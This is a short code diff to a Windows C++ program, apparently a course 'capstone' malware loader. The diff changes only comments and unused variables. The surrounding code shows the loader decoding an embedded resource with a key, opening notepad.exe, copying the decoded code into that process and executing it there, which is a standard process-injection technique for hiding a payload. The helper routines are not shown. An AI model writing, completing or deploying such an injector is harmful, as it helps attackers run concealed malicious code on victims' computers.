@@ -3,7 +3,7 @@
 #include "../utils/resources.h"
 #include "../utils/utility.h"
 
-
+// g++ -m64 -mwindows -o .\capstone.exe .\capstone.cpp ..\utils\resources.o ..\utils\utility2.cpp
 int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR pC, int nC){
 
 //int main(int argc, char const *argv[]){
@@ -12,9 +12,7 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR pC, int nC){
     LPVOID  resAddr;
     LPVOID  remoteAddr;
     DWORD   resSize;
-    DWORD   oldProtection;
     DWORD   pid;
-    CHAR    buffer[255];
     UCHAR   key[] = KK;
     PUCHAR  decoded;
 
@@ -28,7 +26,7 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR pC, int nC){
     // Open remote process
     getProcessHandle("notepad.exe", &processHandle, &pid);
 
-    //Load code in the remote process
+    // Load code in the remote process
     allocateAndCopyRemote(processHandle, &remoteAddr, (LPCVOID)decoded, resSize);
 
     // Execute code in the remote process
